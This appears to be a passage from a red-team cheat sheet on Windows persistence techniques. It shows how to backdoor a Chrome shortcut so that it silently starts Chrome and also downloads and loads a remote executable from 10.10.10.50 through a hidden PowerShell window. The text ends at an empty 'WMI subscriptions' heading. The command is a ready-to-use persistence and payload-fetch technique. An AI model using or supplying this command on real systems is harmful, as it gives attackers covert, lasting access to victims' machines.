# Persistence

## *LNK* backdoor
Backdoor any commonly used shortcut by changing the default target. For example with *Google Chrome*, change the shortcut from:
```
C:\Program Files\Google\Chrome\Application\chrome.exe
```

To:
```powershell
powershell.exe -nop -w hidden -c "[System.Diagnostics.Process]::Start('C:\Program Files\Google\Chrome\Application\chrome.exe');[System.Reflection.Assembly]::Load((iwr 'http://10.10.10.50/i.exe').Content)
```

## *WMI* subscriptions